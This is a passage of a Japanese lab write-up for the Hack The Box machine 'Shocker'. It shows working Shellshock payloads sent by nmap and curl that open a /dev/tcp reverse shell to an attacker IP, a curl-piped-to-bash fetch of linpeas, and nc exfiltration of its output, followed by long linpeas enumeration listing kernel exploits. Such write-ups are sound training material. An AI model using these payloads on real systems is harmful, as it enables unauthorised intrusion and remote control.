Pseudo-Terminal Shell (type '?' for available options)
commix(os_shell) > id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

commix(os_shell) > tty
not a tty

commix(os_shell) > pwd
/usr/lib/cgi-bin

commix(os_shell) > find / -type d -writable
/var/crash /var/lib/lxcfs/proc /var/lib/lxcfs/cgroup /var/tmp /run/lock /run/lock/apache2 /home/shelly /home/shelly/.cache /home/shelly/.nano /dev/mqueue /dev/shm /tmp /tmp/.ICE-unix /tmp/.Test-unix /tmp/.X11-unix /tmp/.XIM-unix /tmp/.font-unix /proc/13652/task/13652/fd /proc/13652/fd /proc/13652/map_files

commix(os_shell) > cd /tmp
[06:44:42] [error] The execution of 'cd /tmp' command, does not return any output.
```
STEP3で使用したNmapスクリプトで、リバースシェルを取得できる  
Busyboxのncでもうまくいったが、今回は`/dev/tcp`を使用する
```sh
└─$ nmap -n -Pn -p80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh,cmd='echo;/bin/bash -i >& /dev/tcp/10.10.14.70/4444 0>&1' 10.129.7.104
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 06:54 EDT
Nmap scan report for 10.129.7.104
Host is up (0.31s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271

Nmap done: 1 IP address (1 host up) scanned in 11.58 seconds
```
Nmapスクリプトでもできるが、もっとシンプルにCurlコマンドでもできる  
ちなみにSTEP3で試したechoコマンドはなくてもRCEできる、違いは判らん
```sh
└─$ curl -A "() { :;}; /bin/bash -i >& /dev/tcp/10.10.14.70/4444 0>&1" http://10.129.7.104/cgi-bin/user.sh
^C
```
リバースシェル取得
```sh
└─$ rlwrap nc -lnvp 4444                                      
listening on [any] 4444 ...
connect to [10.10.14.70] from (UNKNOWN) [10.129.7.104] 36834
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ tty
tty
not a tty
```


## STEP 5
`linpeas.sh`でEoPを探す、KaliのWebサーバにアップロード
```
└─$ cp /usr/share/peass/linpeas/linpeas.sh .


└─$ python3.13 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.7.104 - - [30/Apr/2025 11:56:28] "GET /linpeas.sh HTTP/1.1" 200 -
```
ファイルレスで実行、書き込み権限のあるファルダにコマンド結果を出力
```sh
shelly@Shocker:/usr/lib/cgi-bin$ find / -type d -writable 2> /dev/null
find / -type d -writable 2> /dev/null
/var/crash
/var/lib/lxcfs/proc
/var/lib/lxcfs/cgroup
/var/tmp
/run/lock
/run/lock/apache2
/home/shelly
/home/shelly/.cache
/home/shelly/.nano
/dev/mqueue
/dev/shm
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
/proc/14238/task/14238/fd
/proc/14238/fd
/proc/14238/map_files


shelly@Shocker:/usr/lib/cgi-bin$ cd /tmp
cd /tmp


shelly@Shocker:/tmp$ curl http://10.10.14.70/linpeas.sh | bash > peas.txt
curl http://10.10.14.70/linpeas.sh | bash > peas.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  820k  100  820k    0     0  12840      0  0:01:05  0:01:05 --:--:--  3631. . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
logrotate 3.8.7


shelly@Shocker:/tmp$ nc 10.10.14.70 80 < peas.txt
nc 10.10.14.70 80 < peas.txt
```
nc経由でコマンド結果をKaliで参照
```sh
└─$ nc -lnvp 80 | cat            
listening on [any] 80 ...
connect to [10.10.14.70] from (UNKNOWN) [10.129.7.104] 36160



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz          |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          LinPEAS-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:                                                                                                                                                                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
OS: Linux version 4.4.0-96-generic (buildd@lgw01-10) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017
User & Groups: uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
Hostname: Shocker

[+] /bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                         
[+] /bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)                                                                                                              
                                                                                                                                                                                                                                            

Caching directories DONE
                                                                                                                                                                                                                                            
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                                                                          
                              ╚════════════════════╝                                                                                                                                                                                        
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                                                                                                                           
Linux version 4.4.0-96-generic (buildd@lgw01-10) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017                                                                                 
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.3 LTS
Release:        16.04
Codename:       xenial

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                                                                                                              
Sudo version 1.8.16                                                                                                                                                                                                                         


╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                                                                                                                                      
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                                                                                                

╔══════════╣ Date & uptime
Wed Apr 30 11:56:37 EDT 2025                                                                                                                                                                                                                
 11:56:37 up  9:22,  0 users,  load average: 0.08, 0.02, 0.01

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                                                                                                   
/dev/mapper/Shocker--vg-root /               ext4    errors=remount-ro 0       1                                                                                                                                                            
UUID=c227aef1-7e4c-4094-8b0b-095581dd0bc6 /boot           ext2    defaults        0       2
/dev/mapper/Shocker--vg-swap_1 none            swap    sw              0       0
/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                                                                                        
sda
sda1
sda2
sda5

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                                                                                     
HTTP_HOST=10.129.7.104                                                                                                                                                                                                                      
LS_COLORS=
PWD=/tmp
SHLVL=2
LESSOPEN=| /usr/bin/lesspipe %s
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed                                                                                                                       
dmesg Not Found                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
[+] [CVE-2017-16995] eBPF_verifier                                                                                                                                                                                                          

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Exposure: probable
   Tags: ubuntu=14.04{kernel:4.4.0-*},[ ubuntu=16.04 ]{kernel:4.8.0-*}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-4557] double-fdput()

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working


╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                                                                               
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                                                                                                    
═╣ PaX bins present? .............. PaX Not Found                                                                                                                                                                                           
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                                                                    
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                                                                      
═╣ Seccomp enabled? ............... disabled                                                                                                                                                                                                
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... disabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                                                                                                                                            

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                                                                                         
                                   ╚═══════════╝                                                                                                                                                                                            
╔══════════╣ Container related tools present (if any):
/usr/bin/lxc                                                                                                                                                                                                                                
╔══════════╣ Container details
═╣ Is this a container? ........... No                                                                                                                                                                                                      
═╣ Any running containers? ........ No                                                                                                                                                                                                      
                                                                                                                                                                                                                                            

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                                                                                         
                                     ╚═══════╝                                                                                                                                                                                              
Learn and practice cloud hacking techniques in training.hacktricks.xyz
                                                                                                                                                                                                                                            
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM or Az metadata? ............. No
═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
═╣ Azure Automation Account? ............ No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? ......................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                                                                          
                ╚════════════════════════════════════════════════╝                                                                                                                                                                          
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                                                                                                  
root          1  0.0  1.0  37832  5000 ?        Ss   02:34   0:01 /sbin/init                                                                                                                                                                
root        485  0.0  0.5  27688  2816 ?        Ss   02:34   0:00 /lib/systemd/systemd-journald
root        516  0.0  0.2 102968  1296 ?        Ss   02:34   0:00 /sbin/lvmetad -f
root        532  0.0  0.7  44704  3688 ?        Ss   02:34   0:00 /lib/systemd/systemd-udevd
systemd+    831  0.0  0.4 100324  2372 ?        Ssl  02:34   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root        946  0.0  1.6 192240  7788 ?        Ssl  02:34   0:19 /usr/bin/vmtoolsd
daemon[0m      950  0.0  0.4  26044  2132 ?        Ss   02:34   0:00 /usr/sbin/atd -f
root        952  0.0  0.5 629244  2536 ?        Ssl  02:34   0:03 /usr/bin/lxcfs /var/lib/lxcfs/
root        957  0.0  2.7 342344 13064 ?        Ssl  02:34   0:00 /usr/lib/snapd/snapd
root        964  0.0  0.2  20100  1180 ?        Ss   02:34   0:00 /lib/systemd/systemd-logind
message+    973  0.0  0.7  42900  3672 ?        Ss   02:34   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
  └─(Caps) 0x0000000020000000=cap_audit_write
root        991  0.0  0.5  29008  2852 ?        Ss   02:34   0:00 /usr/sbin/cron -f
syslog      992  0.0  0.6 256396  3200 ?        Ssl  02:34   0:00 /usr/sbin/rsyslogd -n
root        995  0.0  0.2   4400  1272 ?        Ss   02:34   0:00 /usr/sbin/acpid
root        996  0.0  1.1 275864  5756 ?        Ssl  02:34   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       1017  0.0  0.0  13376   148 ?        Ss   02:34   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemon[0mise --scan --syslog
root       1022  0.0  1.1 277088  5732 ?        Ssl  02:34   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       1079  0.0  0.6  16120  2904 ?        Ss   02:34   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.ens192.pid -lf /var/lib/dhcp/dhclient.ens192.leases -I -df /var/lib/dhcp/dhclient6.ens192.leases ens192
root       1170  0.0  1.0  65520  4952 ?        Ss   02:34   0:00 /usr/sbin/sshd -D
root       1185  0.0  0.0   5224   128 ?        Ss   02:34   0:00 /sbin/iscsid
root       1186  0.0  0.7   5724  3524 ?        S<Ls 02:34   0:03 /sbin/iscsid
root       1259  0.0  0.3  15940  1876 tty1     Ss+  02:34   0:00 /sbin/agetty --noclear tty1 linux
root       1309  0.0  0.5  73684  2588 ?        Ss   02:34   0:01 /usr/sbin/apache2 -k start
shelly     1311  0.0  0.4  73432  2116 ?        S    02:34   0:00  _ /usr/sbin/apache2 -k start
shelly    14218  0.0  0.1   9480   916 ?        S    11:51   0:00  |   _ /bin/bash /usr/lib/cgi-bin/user.sh
shelly    14219  0.0  0.8  18944  4024 ?        S    11:51   0:00  |       _ /bin/bash -i
shelly    14239  0.0  1.2  91860  6028 ?        S    11:56   0:00  |           _ curl http://10.10.14.70/linpeas.sh
shelly    14240  0.9  1.0  20204  5060 ?        S    11:56   0:00  |           _ bash
shelly    18786  0.0  0.7  20204  3672 ?        S    11:56   0:00  |               _ bash
shelly    18790  0.0  0.6  34724  3256 ?        R    11:56   0:00  |               |   _ ps fauxwww
shelly    18789  0.0  0.5  20204  2456 ?        S    11:56   0:00  |               _ bash
shelly     1312  0.0  0.5 429544  2468 ?        Sl   02:34   0:10  _ /usr/sbin/apache2 -k start
shelly     1313  0.0  0.5 560608  2632 ?        Sl   02:34   0:10  _ /usr/sbin/apache2 -k start
shelly     1437  0.0  0.4   9484  1984 ?        S    02:37   0:00 /bin/bash /usr/lib/cgi-bin/user.sh
shelly     1438  0.0  1.5  23916  7576 ?        Sl   02:37   0:03  _ /tmp/FlrYi
shelly    12990  0.0  0.4   9484  2164 ?        S    06:34   0:00 /bin/bash /usr/lib/cgi-bin/user.sh
shelly    12991  0.0  1.7  35840  8472 ?        S    06:34   0:00  _ /usr/bin/python3 -c import pty; pty.spawn("/bin/bash")
shelly    12992  0.0  0.8  18944  4164 pts/0    Ss+  06:34   0:00      _ /bin/bash
shelly    13065  0.0  0.4   9484  2092 ?        S    06:35   0:00 /bin/bash /usr/lib/cgi-bin/user.sh
shelly    13066  0.0  1.7  35832  8468 ?        S    06:35   0:00  _ /usr/bin/python3 -c import pty; pty.spawn("/bin/bash")
shelly    13067  0.0  0.8  18944  4004 pts/1    Ss+  06:35   0:00      _ /bin/bash


╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory                                                                                                                           
gdm-password Not Found                                                                                                                                                                                                                      
gnome-keyring-daemon Not Found                                                                                                                                                                                                              
lightdm Not Found                                                                                                                                                                                                                           
vsftpd Not Found                                                                                                                                                                                                                            
apache2 process found (dump creds from memory as root)                                                                                                                                                                                      
sshd Not Found
                                                                                                                                                                                                                                            
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                                                                                                                                   
                                                                                                                                                                                                                                            
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                                                                          
COMMAND     PID   TID             USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME                                                                                                                                               

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                                                                                                             
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                                                                                           

╔══════════╣ Cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                                                                                                        
/usr/bin/crontab                                                                                                                                                                                                                            
incrontab Not Found
-rw-r--r-- 1 root root     722 Apr  5  2016 /etc/crontab                                                                                                                                                                                    

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Sep 21  2022 .
drwxr-xr-x 90 root root 4096 Sep 21  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  191 Sep 22  2017 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 Sep 21  2022 .
drwxr-xr-x 90 root root 4096 Sep 21  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
